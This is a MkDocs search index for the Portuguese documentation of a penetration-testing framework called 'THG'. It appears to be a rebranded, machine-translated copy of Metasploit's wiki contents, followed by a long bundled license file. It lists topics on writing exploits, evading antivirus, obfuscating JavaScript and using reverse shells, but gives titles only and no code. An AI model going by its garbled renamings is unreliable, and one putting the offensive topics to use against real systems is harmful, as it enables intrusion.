{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Success Bem vindo a THG-land. Voc\u00ea \u00e9 um usu\u00e1rio do TGH que deseja come\u00e7ar ou melhorar as coisas de hackers (voc\u00ea tem permiss\u00e3o para invadir)? A maneira mais r\u00e1pida de come\u00e7ar \u00e9 [baixar o instalador bin\u00e1rio do THG] (versao futura) ( http://www.darkcode0x00.com/products/thg/download ). Isso fornecer\u00e1 acesso ao TGH Framework, de c\u00f3digo aberto e gratuito, e a uma avalia\u00e7\u00e3o gratuita do THG-XCODE Pro. Voc\u00ea est\u00e1 ansioso para configurar seu [THG Development Environment] ( https://github.com/rapid7/metasploit-framework/wiki/Setting-Up-a-Metasploit-Development-Environment ) para poder iniciar [[Landing Pull Solicita\u00e7\u00f5es]] e contribuindo com um excelente c\u00f3digo de explora\u00e7\u00e3o? Se assim for, voc\u00ea est\u00e1 no lugar certo. Se voc\u00ea \u00e9 um desenvolvedor de explora\u00e7\u00e3o, deve revisar nossas [[Diretrizes para aceita\u00e7\u00e3o de m\u00f3dulos e aprimoramentos]] para descobrir o que esperamos quando vemos solicita\u00e7\u00f5es pull para novos m\u00f3dulos thg. N\u00e3o faz ideia no que voc\u00ea deve come\u00e7ar a trabalhar? Confira as diretrizes para [[contribuir para o thg]] e mergulhe em [[Configurando um ambiente de desenvolvimento para o thg]]. Come\u00e7ando Configurando um ambiente de desenvolvimento do THG [[Usando o THG]] [[Usando o Git]] [[Relatar um bug]] Contribuindo [[Contribuindo para o THG]] [[Diretrizes para aceitar m\u00f3dulos e aprimoramentos]] [[Erros comuns de codifica\u00e7\u00e3o dos m\u00f3dulo THG]] [[Dicas de estilo]] [[Direitos do Comprador]] [[Solicita\u00e7\u00f5es de recep\u00e7\u00e3o de destino]] Desenvolvimento THG [[Dicas de estilo]] [[Como come\u00e7ar a escrever um modelo de explora\u00e7\u00e3o]] [[Como come\u00e7ar a escrever um m\u00f3dulo auxiliar]] [[Como come\u00e7ar a escrever um m\u00f3dulo de post-ex]] [[Como come\u00e7ar a escrever um script CybersX]] [[Executando m\u00f3dulos privados]] [[Ranking de explora\u00e7\u00e3o]] [[Identificadores de refer\u00eancia do m\u00f3dulo THG]] [[Como verificar os n\u00edveis de patch da Microsoft para sua explora\u00e7\u00e3o]] [[Como limpar arquivos usando o XFileDropper]] [[Como descontinuar um m\u00f3dulo para o THG]] [[Como gerar relat\u00f3rios ou armazenar dados no desenvolvimento de m\u00f3dulos]] [[Como efetuar login no THG]] [[Como ofuscar o JavaScript no THG]] [[Como analisar uma resposta HTTP]] [[Como enviar uma solicita\u00e7\u00e3o HTTP usando HTTPClient]] [[Como enviar uma solicita\u00e7\u00e3o HTTP usando o Rex Proto Http Client]] [[Como usar os gerenciadores de comandos]] [[Como usar as op\u00e7\u00f5es do armazenamento de dados]] [[Como usar o AuthBrute para escrever um bruteforcer]] [[Como usar o PhpEXE para explorar um bug arbitr\u00e1rio no upload de arquivos]] [[Como usar o Powershell em uma explora\u00e7\u00e3o]] [[Como usar o Railgun for Windows p\u00f3s-explora\u00e7\u00e3o]] [[Como usar o mixin do FILEFORMAT para criar uma explora\u00e7\u00e3o de formato de arquivo]] [[Como usar o mix de THG Exploit Remote Tcp]] [[Como usar o Seh mixin para explorar um manipulador de exce\u00e7\u00f5es]] [[Como usar o WbemExec para um ataque de privil\u00e9gio de grava\u00e7\u00e3o no Windows]] [[Como escrever uma explora\u00e7\u00e3o do navegador usando o BrowserExploitServer]] [[Como escrever uma explora\u00e7\u00e3o do navegador usando o HttpServer]] [[Como escrever um m\u00e9todo check()]] [[Como escrever um m\u00f3dulo HTTP LoginScanner]] [[Como escrever um m\u00f3dulo usando HttpServer e HttpClient]] [[Como compactar arquivos com o Xcode Zip Archive]] [[Como usar o Windows do THG Framework Compiler para compilar o c\u00f3digo C]] [[Como usar o TGH Framework Obfuscation CRandomizer]] [[Como descriptografar o RC4 com o THG Framework Compiler]] [[Como decodificar Base64 com o THG Framework Compiler]] [[Como executar o XOR com o THG Framework Compiler]] [[Usando a inje\u00e7\u00e3o ReflectiveDll]] [[Uso do Oracle]] [[Xcode Layout]] [[Defini\u00e7\u00e3o de confiabilidade, efeitos colaterais e estabilidade do m\u00f3dulo]] payloads THG [[Como funcionam as cargas \u00fateis]] [[Mesclando atualiza\u00e7\u00f5es dos pacotes juntos com as cargas \u00fatil do THG]] [[Configura\u00e7\u00e3o cybersX]] [[Comunica\u00e7\u00e3o HTTP cybersX]] [[Modo paran\u00f3ico do mult\u00edmetro]] [[Comunica\u00e7\u00e3o confi\u00e1vel em rede com cybersX]] [[Controle de sono do mult\u00edmetro]] [[cybersX Stageless Mode]] [[Controle de tempo limite do medidor]] [[Controle de transporte por metro]] [[Suporte Unicode cybersX]] [[Payload UUID]] [[Extens\u00e3o Python]] [[Entradas e sa\u00eddas das comunica\u00e7\u00f5es HTTP e HTTPS nos medidores CybersX e THG]] Outros recursos TGH [[Notas da vers\u00e3o do THG 1.0]] [[Downloads por vers\u00e3o]] [[Evadir antiv\u00edrus]] [[Como usar um m\u00f3dulo THG adequadamente]] [[Como usar um shell reverso no THG]] [[Informa\u00e7\u00f5es sobre requisitos n\u00e3o explorados de explora\u00e7\u00e3o do navegador]] [[Como usar o thgpayload]] [[Como usar exim_gethostbyname_bof.rb (estouro de buffer do Exim GHOST)]] [[O que meu erro SMB Xcode Proto significa]] [[Por que o CVE n\u00e3o est\u00e1 dispon\u00edvel]] Recursos do GitHub [[Git Cheatsheet]] [[Git Gotchas]] [[Sites de refer\u00eancia do Git]] [[Poda de ramifica\u00e7\u00e3o remota]]","title":"Introduction"},{"location":"#comecando","text":"Configurando um ambiente de desenvolvimento do THG [[Usando o THG]] [[Usando o Git]] [[Relatar um bug]]","title":"Come\u00e7ando"},{"location":"#contribuindo","text":"[[Contribuindo para o THG]] [[Diretrizes para aceitar m\u00f3dulos e aprimoramentos]] [[Erros comuns de codifica\u00e7\u00e3o dos m\u00f3dulo THG]] [[Dicas de estilo]] [[Direitos do Comprador]] [[Solicita\u00e7\u00f5es de recep\u00e7\u00e3o de destino]]","title":"Contribuindo"},{"location":"#desenvolvimento-thg","text":"[[Dicas de estilo]] [[Como come\u00e7ar a escrever um modelo de explora\u00e7\u00e3o]] [[Como come\u00e7ar a escrever um m\u00f3dulo auxiliar]] [[Como come\u00e7ar a escrever um m\u00f3dulo de post-ex]] [[Como come\u00e7ar a escrever um script CybersX]] [[Executando m\u00f3dulos privados]] [[Ranking de explora\u00e7\u00e3o]] [[Identificadores de refer\u00eancia do m\u00f3dulo THG]] [[Como verificar os n\u00edveis de patch da Microsoft para sua explora\u00e7\u00e3o]] [[Como limpar arquivos usando o XFileDropper]] [[Como descontinuar um m\u00f3dulo para o THG]] [[Como gerar relat\u00f3rios ou armazenar dados no desenvolvimento de m\u00f3dulos]] [[Como efetuar login no THG]] [[Como ofuscar o JavaScript no THG]] [[Como analisar uma resposta HTTP]] [[Como enviar uma solicita\u00e7\u00e3o HTTP usando HTTPClient]] [[Como enviar uma solicita\u00e7\u00e3o HTTP usando o Rex Proto Http Client]] [[Como usar os gerenciadores de comandos]] [[Como usar as op\u00e7\u00f5es do armazenamento de dados]] [[Como usar o AuthBrute para escrever um bruteforcer]] [[Como usar o PhpEXE para explorar um bug arbitr\u00e1rio no upload de arquivos]] [[Como usar o Powershell em uma explora\u00e7\u00e3o]] [[Como usar o Railgun for Windows p\u00f3s-explora\u00e7\u00e3o]] [[Como usar o mixin do FILEFORMAT para criar uma explora\u00e7\u00e3o de formato de arquivo]] [[Como usar o mix de THG Exploit Remote Tcp]] [[Como usar o Seh mixin para explorar um manipulador de exce\u00e7\u00f5es]] [[Como usar o WbemExec para um ataque de privil\u00e9gio de grava\u00e7\u00e3o no Windows]] [[Como escrever uma explora\u00e7\u00e3o do navegador usando o BrowserExploitServer]] [[Como escrever uma explora\u00e7\u00e3o do navegador usando o HttpServer]] [[Como escrever um m\u00e9todo check()]] [[Como escrever um m\u00f3dulo HTTP LoginScanner]] [[Como escrever um m\u00f3dulo usando HttpServer e HttpClient]] [[Como compactar arquivos com o Xcode Zip Archive]] [[Como usar o Windows do THG Framework Compiler para compilar o c\u00f3digo C]] [[Como usar o TGH Framework Obfuscation CRandomizer]] [[Como descriptografar o RC4 com o THG Framework Compiler]] [[Como decodificar Base64 com o THG Framework Compiler]] [[Como executar o XOR com o THG Framework Compiler]] [[Usando a inje\u00e7\u00e3o ReflectiveDll]] [[Uso do Oracle]] [[Xcode Layout]] [[Defini\u00e7\u00e3o de confiabilidade, efeitos colaterais e estabilidade do m\u00f3dulo]]","title":"Desenvolvimento THG"},{"location":"#payloads-thg","text":"[[Como funcionam as cargas \u00fateis]] [[Mesclando atualiza\u00e7\u00f5es dos pacotes juntos com as cargas \u00fatil do THG]] [[Configura\u00e7\u00e3o cybersX]] [[Comunica\u00e7\u00e3o HTTP cybersX]] [[Modo paran\u00f3ico do mult\u00edmetro]] [[Comunica\u00e7\u00e3o confi\u00e1vel em rede com cybersX]] [[Controle de sono do mult\u00edmetro]] [[cybersX Stageless Mode]] [[Controle de tempo limite do medidor]] [[Controle de transporte por metro]] [[Suporte Unicode cybersX]] [[Payload UUID]] [[Extens\u00e3o Python]] [[Entradas e sa\u00eddas das comunica\u00e7\u00f5es HTTP e HTTPS nos medidores CybersX e THG]]","title":"payloads THG"},{"location":"#outros-recursos-tgh","text":"[[Notas da vers\u00e3o do THG 1.0]] [[Downloads por vers\u00e3o]] [[Evadir antiv\u00edrus]] [[Como usar um m\u00f3dulo THG adequadamente]] [[Como usar um shell reverso no THG]] [[Informa\u00e7\u00f5es sobre requisitos n\u00e3o explorados de explora\u00e7\u00e3o do navegador]] [[Como usar o thgpayload]] [[Como usar exim_gethostbyname_bof.rb (estouro de buffer do Exim GHOST)]] [[O que meu erro SMB Xcode Proto significa]] [[Por que o CVE n\u00e3o est\u00e1 dispon\u00edvel]]","title":"Outros recursos TGH"},{"location":"#recursos-do-github","text":"[[Git Cheatsheet]] [[Git Gotchas]] [[Sites de refer\u00eancia do Git]] [[Poda de ramifica\u00e7\u00e3o remota]]","title":"Recursos do GitHub"},{"location":"LICENSE/","text":"Files: * Copyright: 2018-2030, darkcode0x00, Inc. License: BSD-3-clause The THG-FRAMEWORK is provided under the 3-clause BSD license provided at the end of this file. The copyright on this package is held by darkcode0x00, Inc. This license does not apply to third-party components detailed below. Last updated: 2018-Nov-04 License: BSD-2-clause Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met: . Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer. . Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution. . THIS SOFTWARE IS PROVIDED BY {{THE COPYRIGHT HOLDERS AND CONTRIBUTORS}} \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL {{THE COPYRIGHT HOLDER OR CONTRIBUTORS}} BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. License: BSD-3-clause Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met: . * Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer. . * Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution. . * Neither the name of darkcode0x00, Inc. nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission. . THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. License: BSD-4-clause Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met: 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer. 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution. 3. All advertising materials mentioning features or use of this software must display the following acknowledgement: This product includes software developed by the . 4. Neither the name of the nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission. . THIS SOFTWARE IS PROVIDED BY ''AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. License: Ruby 1. You may make and give away verbatim copies of the source form of the software without restriction, provided that you duplicate all of the original copyright notices and associated disclaimers. . 2. You may modify your copy of the software in any way, provided that you do at least ONE of the following: . a) place your modifications in the Public Domain or otherwise make them Freely Available, such as by posting said modifications to Usenet or an equivalent medium, or by allowing the author to include your modifications in the software. . b) use the modified software only within your corporation or organization. . c) rename any non-standard executables so the names do not conflict with standard executables, which must also be provided. . d) make other distribution arrangements with the author. . 3. You may distribute the software in object code or executable form, provided that you do at least ONE of the following: . a) distribute the executables and library files of the software, together with instructions (in the manual page or equivalent) on where to get the original distribution. . b) accompany the distribution with the machine-readable source of the software. . c) give non-standard executables non-standard names, with instructions on where to get the original software distribution. . d) make other distribution arrangements with the author. . 4. You may modify and include the part of the software into any other software (possibly commercial). But some files in the distribution are not written by the author, so that they are not under this terms. They are gc.c(partly), utils.c(partly), regex.[ch], fnmatch.[ch], glob.c, st.[ch] and some files under the ./missing directory. See each file for the copying condition. . 5. The scripts and library files supplied as input to or produced as output from the software do not automatically fall under the copyright of the software, but belong to whomever generated them, and may be sold commercially, and may be aggregated with this software. . 6. THIS SOFTWARE IS PROVIDED \"AS IS\" AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED WARRANTIES OF MERCHANTIBILITY AND FITNESS FOR A PARTICULAR PURPOSE. License: GPL-2 This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 2 of the License, or (at your option) any later version. . This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details. . You should have received a copy of the GNU General Public License along with this package; if not, write to the Free Software Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA . On Debian systems, the full text of the GNU General Public License version 2 can be found in the file `/usr/share/common-licenses/GPL-2'. License: LGPL-2.1 This library is free software; you can redistribute it and/or modify it under the terms of the GNU Lesser General Public License as published by the Free Software Foundation; either version 2.1 of the License, or (at your option) any later version. . This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU Lesser General Public License for more details. . You should have received a copy of the GNU Lesser General Public License along with this library; if not, write to the Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA License: OpenSSL Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met: . 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer. . 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution. . 3. All advertising materials mentioning features or use of this software must display the following acknowledgment: \"This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. ( http://www.openssl.org/ )\" . 4. The names \"OpenSSL Toolkit\" and \"OpenSSL Project\" must not be used to endorse or promote products derived from this software without prior written permission. For written permission, please contact openssl-core@openssl.org . . 5. Products derived from this software may not be called \"OpenSSL\" nor may \"OpenSSL\" appear in their names without prior written permission of the OpenSSL Project. . 6. Redistributions of any form whatsoever must retain the following acknowledgment: \"This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit ( http://www.openssl.org/ )\" . THIS SOFTWARE IS PROVIDED BY THE OpenSSL PROJECT `AS IS'' AND ANY EXPRESSED OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE OpenSSL PROJECT OR ITS CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. . This product includes cryptographic software written by Eric Young ( eay@cryptsoft.com ). This product includes software written by Tim Hudson ( tjh@cryptsoft.com ). License: SSLeay This package is an SSL implementation written by Eric Young ( eay@cryptsoft.com ). The implementation was written so as to conform with Netscapes SSL. . This library is free for commercial and non-commercial use as long as the following conditions are aheared to. The following conditions apply to all code found in this distribution, be it the RC4, RSA, lhash, DES, etc., code; not just the SSL code. The SSL documentation included with this distribution is covered by the same copyright terms except that the holder is Tim Hudson ( tjh@cryptsoft.com ). . Copyright remains Eric Young's, and as such any Copyright notices in the code are not to be removed. If this package is used in a product, Eric Young should be given attribution as the author of the parts of the library used. This can be in the form of a textual message at program startup or in documentation (online or textual) provided with the package. . Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met: 1. Redistributions of source code must retain the copyright notice, this list of conditions and the following disclaimer. 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution. 3. All advertising materials mentioning features or use of this software must display the following acknowledgement: \"This product includes cryptographic software written by Eric Young ( eay@cryptsoft.com )\" The word 'cryptographic' can be left out if the rouines from the library being used are not cryptographic related :-). 4. If you include any Windows specific code (or a derivative thereof) from the apps directory (application code) you must include an acknowledgement: \"This product includes software written by Tim Hudson ( tjh@cryptsoft.com )\" . THIS SOFTWARE IS PROVIDED BY ERIC YOUNG `AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. . The licence and distribution terms for any publically available version or derivative of this code cannot be changed. i.e. this code cannot simply be copied and put under another distribution licence [including the GNU Public Licence.] License: MIT Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: . The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. . THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. License: Artistic Copyright \u00a9 2000-2006, The Perl Foundation. . Everyone is permitted to copy and distribute verbatim copies of this license document, but changing it is not allowed. . Preamble . This license establishes the terms under which a given free software Package may be copied, modified, distributed, and/or redistributed. The intent is that the Copyright Holder maintains some artistic control over the development of that Package while still keeping the Package available as open source and free software. . You are always permitted to make arrangements wholly outside of this license directly with the Copyright Holder of a given Package. If the terms of this license do not permit the full use that you propose to make of the Package, you should contact the Copyright Holder and seek a different licensing arrangement. . Definitions . \"Copyright Holder\" means the individual(s) or organization(s) named in the copyright notice for the entire Package. . \"Contributor\" means any party that has contributed code or other material to the Package, in accordance with the Copyright Holder's procedures. . \"You\" and \"your\" means any person who would like to copy, distribute, or modify the Package. . \"Package\" means the collection of files distributed by the Copyright Holder, and derivatives of that collection and/or of those files. A given Package may consist of either the Standard Version, or a Modified Version. . \"Distribute\" means providing a copy of the Package or making it accessible to anyone else, or in the case of a company or organization, to others outside of your company or organization. . \"Distributor Fee\" means any fee that you charge for Distributing this Package or providing support for this Package to another party. It does not mean licensing fees. . \"Standard Version\" refers to the Package if it has not been modified, or has been modified only in ways explicitly requested by the Copyright Holder. . \"Modified Version\" means the Package, if it has been changed, and such changes were not explicitly requested by the Copyright Holder. . \"Original License\" means this Artistic License as Distributed with the Standard Version of the Package, in its current version or as it may be modified by The Perl Foundation in the future. . \"Source\" form means the source code, documentation source, and configuration files for the Package. . \"Compiled\" form means the compiled bytecode, object code, binary, or any other form resulting from mechanical transformation or translation of the Source form. . Permission for Use and Modification Without Distribution . (1) You are permitted to use the Standard Version and create and use Modified Versions for any purpose without restriction, provided that you do not Distribute the Modified Version. . . Permissions for Redistribution of the Standard Version . (2) You may Distribute verbatim copies of the Source form of the Standard Version of this Package in any medium without restriction, either gratis or for a Distributor Fee, provided that you duplicate all of the original copyright notices and associated disclaimers. At your discretion, such verbatim copies may or may not include a Compiled form of the Package. . (3) You may apply any bug fixes, portability changes, and other modifications made available from the Copyright Holder. The resulting Package will still be considered the Standard Version, and as such will be subject to the Original License. . . Distribution of Modified Versions of the Package as Source . (4) You may Distribute your Modified Version as Source (either gratis or for a Distributor Fee, and with or without a Compiled form of the Modified Version) provided that you clearly document how it differs from the Standard Version, including, but not limited to, documenting any non-standard features, executables, or modules, and provided that you do at least ONE of the following: . (a) make the Modified Version available to the Copyright Holder of the Standard Version, under the Original License, so that the Copyright Holder may include your modifications in the Standard Version. . (b) ensure that installation of your Modified Version does not prevent the user installing or running the Standard Version. In addition, the Modified Version must bear a name that is different from the name of the Standard Version. . \u00a9 allow anyone who receives a copy of the Modified Version to make the Source form of the Modified Version available to others under . (i) the Original License or . (ii) a license that permits the licensee to freely copy, modify and redistribute the Modified Version using the same licensing terms that apply to the copy that the licensee received, and requires that the Source form of the Modified Version, and of any works derived from it, be made freely available in that license fees are prohibited but Distributor Fees are allowed. . . Distribution of Compiled Forms of the Standard Version or Modified Versions without the Source . (5) You may Distribute Compiled forms of the Standard Version without the Source, provided that you include complete instructions on how to get the Source of the Standard Version. Such instructions must be valid at the time of your distribution. If these instructions, at any time while you are carrying out such distribution, become invalid, you must provide new instructions on demand or cease further distribution. If you provide valid instructions or cease distribution within thirty days after you become aware that the instructions are invalid, then you do not forfeit any of your rights under this license. . (6) You may Distribute a Modified Version in Compiled form without the Source, provided that you comply with Section 4 with respect to the Source of the Modified Version. . . Aggregating or Linking the Package . (7) You may aggregate the Package (either the Standard Version or Modified Version) with other packages and Distribute the resulting aggregation provided that you do not charge a licensing fee for the Package. Distributor Fees are permitted, and licensing fees for other components in the aggregation are permitted. The terms of this license apply to the use and Distribution of the Standard or Modified Versions as included in the aggregation. . (8) You are permitted to link Modified and Standard Versions with other works, to embed the Package in a larger work of your own, or to build stand-alone binary or bytecode versions of applications that include the Package, and Distribute the result without restriction, provided the result does not expose a direct interface to the Package. . . Items That are Not Considered Part of a Modified Version . (9) Works (including, but not limited to, modules and scripts) that merely extend or make use of the Package, do not, by themselves, cause the Package to be a Modified Version. In addition, such works are not considered parts of the Package itself, and are not subject to the terms of this license. . . General Provisions . (10) Any use, modification, and distribution of the Standard or Modified Versions is governed by this Artistic License. By using, modifying or distributing the Package, you accept this license. Do not use, modify, or distribute the Package, if you do not accept this license. . (11) If your Modified Version has been derived from a Modified Version made by someone other than you, you are nevertheless required to ensure that your Modified Version complies with the requirements of this license. . (12) This license does not grant you the right to use any trademark, service mark, tradename, or logo of the Copyright Holder. . (13) This license includes the non-exclusive, worldwide, free-of-charge patent license to make, have made, use, offer to sell, sell, import and otherwise transfer the Package with respect to any patent claims licensable by the Copyright Holder that are necessarily infringed by the Package. If you institute patent litigation (including a cross-claim or counterclaim) against any party alleging that the Package constitutes direct or contributory patent infringement, then this Artistic License to you shall terminate on the date that such litigation is filed. . (14) Disclaimer of Warranty: THE PACKAGE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS \"AS IS' AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES. THE IMPLIED WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, OR NON-INFRINGEMENT ARE DISCLAIMED TO THE EXTENT PERMITTED BY YOUR LOCAL LAW. UNLESS REQUIRED BY LAW, NO COPYRIGHT HOLDER OR CONTRIBUTOR WILL BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, OR CONSEQUENTIAL DAMAGES ARISING IN ANY WAY OUT OF THE USE OF THE PACKAGE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. License: Apache Version 1.1, 2000 Modifications by CORE Security Technologies . Copyright \u00a9 2000 The Apache Software Foundation. All rights reserved. . Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met: . 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer. . 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution. . 3. The end-user documentation included with the redistribution, if any, must include the following acknowledgment: \"This product includes software developed by CORE Security Technologies ( http://www.coresecurity.com/ ).\" Alternately, this acknowledgment may appear in the software itself, if and wherever such third-party acknowledgments normally appear. . 4. The names \"Impacket\" and \"CORE Security Technologies\" must not be used to endorse or promote products derived from this software without prior written permission. For written permission, please contact oss@coresecurity.com . . 5. Products derived from this software may not be called \"Impacket\", nor may \"Impacket\" appear in their name, without prior written permission of CORE Security Technologies. . THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESSED OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE APACHE SOFTWARE FOUNDATION OR ITS CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. License: Apache 